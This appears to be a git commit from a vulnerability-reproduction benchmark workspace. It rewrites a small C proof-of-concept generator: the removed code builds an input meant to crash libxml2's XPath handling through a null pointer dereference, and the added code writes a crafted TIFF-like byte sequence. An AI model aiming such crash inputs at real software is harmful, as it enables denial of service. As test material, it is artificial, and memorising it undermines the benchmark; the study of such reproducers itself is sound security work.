d3094bf6578b65c19dbf83aeb5a8aeaf859e1d47
Sudarshan S N <imsukudu24@gmail.com>
2026-07-07 11:50:02 +0000

    updated logs

--- trial_workspace/poc.c
+++ trial_workspace/poc.c
@@ -1,43 +1,14 @@
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-/* PoC for arvo:62886 */
-/* Triggers: null pointer dereference in xmlDictFindEntry (libxml2 xpath) */
-/* Vuln class: null_pointer_dereference */
-
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
-    if (!f) { perror("fopen"); return 1; }
-    
-    /* Write 4-byte big-endian maxAllocs (0x00000000 = no limit) */
-    fputc(0x00, f);
-    fputc(0x00, f);
-    fputc(0x00, f);
-    fputc(0x00, f);
-    
-    /* XPath expression: "//ns:child" is 9 bytes */
-    unsigned char xpath[] = "//ns:child";
-    unsigned short xpath_len = 9;
-    
-    /* Write 2-byte big-endian length for XPath */
-    fputc((xpath_len >> 8) & 0xFF, f);
-    fputc(xpath_len & 0xFF, f);
-    
-    /* Write XPath expression bytes */
-    fwrite(xpath, 1, xpath_len, f);
-    
-    /* XML document: "<root xmlns:ns=\"http://x\"/>" is 27 bytes */
-    unsigned char xml[] = "<root xmlns:ns=\"http://x\"/>";
-    unsigned short xml_len = 27;
-    
-    /* Write 2-byte big-endian length for XML */
-    fputc((xml_len >> 8) & 0xFF, f);
-    fputc(xml_len & 0xFF, f);
-    
-    /* Write XML document bytes */
-    fwrite(xml, 1, xml_len, f);
-    
+    if (!f) return 1;
+    fwrite("\x03\x00\x00\x00", 1, 4, f);
+    fwrite("\x49\x49\x2a\x00", 1, 4, f);
+    fwrite("\x08\x00\x00\x00", 1, 4, f);
+    fwrite("\x02\x00", 1, 2, f);
+    fwrite("\x00\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00", 1, 12, f);
+    fwrite("\x01\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00", 1, 12, f);
+    fwrite("\x00\x00\x00\x00", 1, 4, f);
     fclose(f);
     return 0;
 }
